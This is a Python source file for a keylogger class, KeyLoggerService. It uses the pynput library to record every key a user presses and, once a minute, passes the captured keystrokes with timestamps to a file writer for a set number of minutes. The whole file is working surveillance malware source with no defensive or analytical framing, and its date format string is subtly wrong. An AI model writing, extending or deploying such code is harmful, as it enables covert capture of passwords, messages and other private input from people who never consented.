import time
from datetime import datetime
from pynput import keyboard
from file_writer import FileWriter
import threading


class KeyLoggerService:

    def __init__(self,run_time):
        self.keyboard_listener = None
        self.key_buffer = []
        self.lock = threading.Lock()
        self.run_time = run_time


    def start_monitoring(self):

        self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        self.keyboard_listener.start()

        self.timer_thread = threading.Timer(self.run_time * 60, self.stop_listener)
        self.timer_thread.start()

        self.send_every_minute()

        self.keyboard_listener.join()


    def on_key_press(self, key):
        with self.lock:
            try:
                if isinstance(key, keyboard.KeyCode):
                    self.key_buffer.append(key.char)
                else:
                    self.key_buffer.append(key.name)
            except Exception as e:
                print('Error: ', e)

    def send_every_minute(self):

        for i in range(self.run_time):
            time.sleep(60)
            with self.lock:
                buffer = self.key_buffer.copy()
                if buffer:
                    self.clean_buffer()
                    time_ = datetime.now().strftime('%H:%M:%S')
                    time_day_ = datetime.now().strftime('%Y:%M:%D')
                    buffer.append(time_)
                    buffer.append(time_day_)
                    FileWriter(buffer)

    def stop_listener(self):
        self.keyboard_listener.stop()

    def clean_buffer(self):
        self.key_buffer = []